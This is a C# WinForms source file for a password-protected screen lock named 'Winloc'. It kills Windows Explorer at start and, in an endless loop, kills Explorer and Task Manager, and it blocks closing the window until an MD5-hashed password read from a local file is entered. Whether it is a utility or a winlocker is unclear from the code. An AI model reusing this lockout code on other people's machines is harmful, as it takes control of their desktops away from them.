using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;
using ProcessKiller;
using System.Threading;
using System.Diagnostics;

namespace Winloc
{
    /// <summary>
    /// Логика взаимодействия для MainWindow.xaml
    /// </summary>
    public partial class Form1 : Form
    {
        public string pass = "";
        public bool Closing = false;

        public Form1()
        {
            InitializeComponent();
            pass = File.ReadAllText($"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)}/EyesPower/Passworld.txt");
            Proces.Kill("explorer");
            Thread thread = new Thread(new ThreadStart(Taskmsg));
            thread.Start();
        }

        private void btpass_Click(object sender, EventArgs e)
        {
            var md5create = MD5.Create();
            var md5 = md5create.ComputeHash(Encoding.UTF8.GetBytes(lbpass.Text));

            if (pass == Convert.ToBase64String(md5))
            {
                MessageBox.Show("Пароль верный!", "Уря!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                Closing = true;
                Process.Start("explorer");
                Environment.Exit(0);
            }
            else if (pass != Convert.ToBase64String(md5))
            {
                MessageBox.Show("Пароль неверный!", "Нееее!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        public void Taskmsg()
        {
            while (true)
            {
                Task.Delay(50).Wait();
                Proces.Kill("explorer");
                Proces.Kill("Taskmgr");
                Proces.Kill("taskmgr");
            }
        }

        //private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        //{
        //    if (altF4)
        //    {
        //        if (e.CloseReason == CloseReason.UserClosing)
        //            e.Cancel = true;
        //        altF4 = false;
        //    }
        //}

        private void Form1_FormClosing_1(object sender, FormClosingEventArgs e)
        {
            if (Closing == false)
            {
                e.Cancel = true;
            }
            else
            {
                e.Cancel = false;
            }
        }
    }
}
